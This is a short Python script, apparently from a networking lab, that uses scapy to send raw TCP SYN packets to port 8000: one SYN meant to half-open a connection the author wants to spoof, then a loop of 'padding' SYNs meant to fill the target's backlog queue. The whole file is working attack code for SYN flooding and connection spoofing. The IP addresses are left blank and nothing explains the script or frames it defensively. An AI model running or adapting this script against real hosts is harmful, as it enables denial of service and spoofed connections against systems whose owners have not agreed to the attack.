from scapy.all import *
import time
import socket

conf.L3RawSocket =  L3RawSocket

# half-open tcp connection that we want to spoof
ip_hdr = IP(src='',dst='')
tcp_hdr1 = TCP(sport=12345,dport=8000,flags='S',seq=0)

# syn_ack = sr1(ip_hdr/tcp_hdr1,verbose=0)
send(ip_hdr/tcp_hdr1,verbose=0)


# other padding connections
backlog_queue_len = 3
tcp_hdr_list = []
for i in range(13000,13000+backlog_queue_len-1):
    tcp_hdr_list.append(TCP(sport=i,dport=8000,flags='S',seq=0))




while(1):
    # send first SYN to half-open the target TCP connection
    send(ip_hdr/tcp_hdr1,verbose=0) 
    time.sleep(1)


    # send padding SYNs to fill the backlog queue
    for tcp_item in tcp_hdr_list:
        send(ip_hdr/tcp_item,verbose=0)
        time.sleep(0.5)
